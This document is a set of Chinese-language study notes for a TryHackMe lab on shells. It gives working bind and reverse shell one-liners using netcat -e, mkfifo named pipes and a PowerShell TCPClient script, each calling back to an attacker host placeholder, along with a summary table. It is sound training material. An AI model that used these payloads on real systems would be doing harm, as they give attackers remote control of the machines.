> [!info] LINK & TAG
> [TryHackMe | What the Shell?](https://tryhackme.com/room/introtoshells)
> 
> #tag
## 1. Netcat 直接執行 (-e 選項)

在某些版本的 Netcat（如 Windows 版的 `nc.exe` 或 Linux 的 `netcat-traditional`）中，可以使用 `-e` 參數在建立連線時直接執行程式。

- **Bind Shell (目標機監聽)：**
    
    Bash
    
    ```
    nc -lvnp <PORT> -e /bin/bash
    ```
    
- **Reverse Shell (目標機連回)：**
    
    Bash
    
    ```
    nc <LOCAL-IP> <PORT> -e /bin/bash
    ```
    

> **注意：** 大多數現代 Linux 發行版預設安裝的 Netcat 版本（如 OpenBSD 版）出於安全考慮已**移除**了 `-e` 選項。

---

## 2. Linux 命名管道 (Named Pipes) Payloads

當 Netcat 不支援 `-e` 參數時，我們可以使用 Linux 的「命名管道 (FIFO)」來手動建立輸入與輸出的迴圈。

### **Bind Shell**

在目標機執行以下指令開啟監聽埠：

Bash

```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### **Reverse Shell**

在目標機執行以下指令連回攻擊機：

Bash

```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

**原理簡析：**

1. `mkfifo /tmp/f`: 建立一個名為 `f` 的管道文件。
    
2. `nc ... < /tmp/f`: 將管道的內容作為 Netcat 的輸入。
    
3. `| /bin/sh`: 將 Netcat 收到的指令交給 shell 執行。
    
4. `>/tmp/f 2>&1`: 將 shell 的執行結果（Stdout）與錯誤訊息（Stderr）導回管道 `f`，形成閉環。
    

---

## 3. Windows PowerShell Reverse Shell

在現代 Windows Server 環境中，PowerShell 是最常用且強大的工具。以下是一個通用的 PowerShell 一行Reverse Shell (One-liner)：

PowerShell

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- **使用方式：1** 只需要將 `<ATTACKER-IP>` 和 `<PORT>` 替換為你的監聽資訊。
    
- **優點：** 不需要額外上傳任何 `.exe` 檔案，直接在記憶體中運行。
    

---

## 4. 資源推薦：PayloadsAllTheThings

如果你需要針對不同語言（Python, PHP, Perl, Ruby 等）的 Payload，推薦參考以下資源：

- **GitHub 專案：** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    
- 這是一個極為完整的資料庫，包含了各種環境下的一行 Shell 代碼 (One-liners)。
    

---

## 總結表格

|**類型**|**環境**|**核心指令 / 工具**|**特點**|
|---|---|---|---|
|**nc -e**|Windows / 舊版 Linux|`nc -e /bin/bash`|最簡單，但現代系統較少見|
|**Named Pipe**|Linux (通用)|`mkfifo` + `nc` + 管道重定向|繞過 `-e` 限制的最佳方案|
|**PowerShell**|Windows|`New-Object System.Net.Sockets`|無檔案化攻擊 (Fileless)，隱蔽性高|
